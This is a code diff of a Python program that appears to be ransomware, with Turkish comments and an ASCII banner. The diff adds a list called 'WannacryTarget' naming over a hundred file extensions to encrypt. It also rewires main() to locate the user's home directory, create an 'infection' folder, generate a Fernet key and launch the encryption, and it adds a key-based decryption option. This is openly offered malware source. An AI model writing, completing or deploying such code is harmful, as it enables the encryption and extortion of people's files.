@@ -1,6 +1,8 @@
 import argparse
 import os
 from cryptography.fernet import Fernet
+from encrypted import start
+from decrypted import decrypedFile
 
 
 header = r"""
@@ -15,6 +17,23 @@ header = r"""
        ░               ░ ░  ░ ░      ░  ░    ░  ░  ░    ░ ░      ░  ░       ░   
                            ░                                                   
 """
+WannacryTarget = [
+    ".3ds", ".3g2", ".3gp", ".7z", ".ace", ".adb", ".adp", ".ai", ".ani",
+    ".apk", ".app", ".appx", ".arc", ".arj", ".asf", ".asp", ".aspx", ".avb",
+    ".avi", ".bak", ".bat", ".bf", ".bin", ".bmp", ".bz2", ".cab", ".cbr",
+    ".cfa", ".cfg", ".cgi", ".class", ".clp", ".cmx", ".cob", ".com", ".conf",
+    ".cpp", ".crt", ".cs", ".css", ".csv", ".dat", ".db", ".dbf", ".dcr",
+    ".deb", ".dmg", ".doc", ".docx", ".dot", ".dotx", ".dwg", ".dxf", ".eml",
+    ".eps", ".exe", ".fla", ".flv", ".gif", ".gz", ".h", ".html", ".htm", ".ico",
+    ".iso", ".jar", ".java", ".jpeg", ".jpg", ".js", ".json", ".key", ".lnk",
+    ".log", ".m4a", ".m4v", ".mdb", ".mid", ".midi", ".mkv", ".mov", ".mp3",
+    ".mp4", ".mpeg", ".mpg", ".msi", ".msg", ".odt", ".ogg", ".ost", ".otf",
+    ".part", ".pas", ".pdf", ".php", ".png", ".pps", ".ppt", ".pptx", ".psd",
+    ".rar", ".raw", ".rb", ".rpm", ".rtf", ".sav", ".sln", ".sql", ".swf",
+    ".sys", ".tar", ".tif", ".tiff", ".tmp", ".ttf", ".txt", ".vob", ".wav",
+    ".wma", ".wmv", ".xls", ".xlsx", ".xml", ".zip"
+]
+
 
 def arg_parse():
     print (header)
@@ -72,16 +91,22 @@ def generate_key():
 def main():
     args = arg_parse() #argümanları pars edip alıyorum
     silent = False
+    homePath = getHome() #kullanıcnın home dizininin yolunu alıyorum path varmı yokmu bunun kontrollerini yapıyorum
     if args.version:
        print("version : 0.0.2")
     elif args.reverse:
-       print("sa")
+        key_path = args.reverse[0]
+        with open(key_path, "rb") as f:
+            key = f.read()
+        decrypedFile(homePath, key)
     elif args.silent:
         silent = args.silent
         print("sesiz moda geçti")
-    homePath = getHome() #kullanıcnın home dizininin yolunu alıyorum path varmı yokmu bunun kontrollerini yapıyorum
-    infectionPath = infectionFolder(homePath) #home dizinine infection adında bir dosya yoksa oluşturuyor
-    key = generate_key() #bana bir şifreleme anahtarı oluşturup dosyaya kaydediyor sonradan dosyaya kaydetme işin kaldırabilirim
+        silent = True
+    if (not args.version and not args.reverse):
+        infectionPath = infectionFolder(homePath) #home dizinine infection adında bir dosya yoksa oluşturuyor
+        key = generate_key() #bana bir şifreleme anahtarı oluşturup dosyaya kaydediyor sonradan dosyaya kaydetme işin kaldırabilirim
+        start(homePath, silent,WannacryTarget, infectionPath, key)
 
 if __name__ == "__main__":
     main()
